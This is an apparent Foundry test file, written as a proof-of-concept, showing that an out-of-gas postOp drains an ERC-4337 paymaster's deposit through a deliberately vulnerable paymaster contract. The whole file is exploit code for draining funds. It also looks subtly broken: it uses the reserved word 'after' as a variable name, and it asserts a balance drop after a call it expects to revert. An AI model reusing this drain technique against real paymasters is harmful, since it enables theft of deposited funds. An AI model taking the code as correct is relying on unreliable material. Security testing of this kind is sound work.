// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "account-abstraction/contracts/core/EntryPoint.sol";
import "account-abstraction/contracts/interfaces/PackedUserOperation.sol";
import "../src/SimpleAccount.sol";
import "../src/VulnerablePaymaster.sol";

contract EntryPointRealTest is Test {
    EntryPoint entryPoint;
    SimpleAccount account;
    VulnerablePaymaster paymaster;
    uint256 constant POST_OP_GAS = 200_000;

    function setUp() public {
        entryPoint = new EntryPoint();
        account = new SimpleAccount(address(entryPoint));
        paymaster = new VulnerablePaymaster();
        vm.deal(address(paymaster), 1 ether);
        entryPoint.depositTo{value: 1 ether}(address(paymaster));
    }

    function test_PostOpOOG_DrainsFullStipend() public {
        PackedUserOperation memory op = PackedUserOperation({
            sender: address(account),
            nonce: account.getNonce(),
            initCode: "",
            callData: "",
            accountGasLimits: bytes32(uint256(100_000) << 128 | 50_000),
            preVerificationGas: 50_000,
            gasFees: bytes32(uint256(tx.gasprice) << 128 | tx.gasprice),
            paymasterAndData: abi.encodePacked(address(paymaster), uint128(100_000), uint128(POST_OP_GAS), bytes("")),
            signature: "0xdeadbeef"
        });

        PackedUserOperation[] memory ops = new PackedUserOperation[](1);
        ops[0] = op;

        uint256 before = entryPoint.balanceOf(address(paymaster));

        vm.expectRevert(IEntryPoint.PostOpReverted.selector);
        entryPoint.handleOps(ops, payable(address(this)));

        uint256 after = entryPoint.balanceOf(address(paymaster));

        uint256 expectedDrain = POST_OP_GAS * tx.gasprice;
        uint256 actualDrain = before - after;

        assertGt(actualDrain, (expectedDrain * 80) / 100, "Drain is less than 80% of stipend");
    }

    receive() external payable {}
}
